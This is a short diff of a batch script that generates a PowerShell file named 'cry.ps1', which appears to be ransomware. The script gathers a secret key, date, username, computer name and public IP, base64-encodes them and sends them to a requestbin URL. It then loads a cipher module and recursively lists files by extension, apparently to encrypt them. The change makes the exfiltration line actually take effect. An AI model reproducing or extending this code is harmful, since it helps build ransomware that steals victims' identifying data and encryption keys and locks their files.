@@ -135,8 +135,8 @@ echo $secretkey = $code1 + $code2 + "=" >> cry.ps1
 echo $date = Get-Date -Format "dddd_dd/MM/yyyy_HH:mm" >> cry.ps1
 echo $user = $env:UserName >> cry.ps1
 echo $computername = $env:ComputerName >> cry.ps1
-echo $ip = (Invoke-WebRequest -Uri "http://ifconfig.me/ip").Content >> cry.ps1
-echo $DataEncode = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("%id%_" + $secretkey + "_" + $date + "_" + $user + "_" + $computername + "_" + $ip))
+echo $ip = (Invoke-WebRequest -UseBasicParsing -Uri "http://ifconfig.me/ip").Content >> cry.ps1
+echo $DataEncode = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("%id%_" + $secretkey + "_" + $date + "_" + $user + "_" + $computername + "_" + $ip)) >> cry.ps1
 echo (New-Object System.Net.WebClient).DownloadString("http://requestbin.io/link_bin?" + $DataEncode) >> cry.ps1
 echo Import-Module Cipher >> cry.ps1
 echo $files = get-childitem folder_location -recurse -Include list_extension ^| where {^! $_.PSIsContainer} >> cry.ps1
